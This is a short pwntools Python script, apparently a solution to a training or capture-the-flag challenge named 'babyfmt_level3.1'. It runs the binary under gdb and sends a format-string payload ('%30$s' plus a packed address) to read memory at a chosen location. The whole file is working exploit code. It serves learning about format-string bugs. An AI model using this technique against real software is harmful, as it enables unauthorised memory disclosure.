from pwn import * 

binary = './babyfmt_level3.1'

p = process(binary)

s = '''
b * printf
'''



gdb.attach(p, s)
p.sendline("%30$s-\x10\x41\x40\x00\x00\x00\x00\x00")




p.interactive()





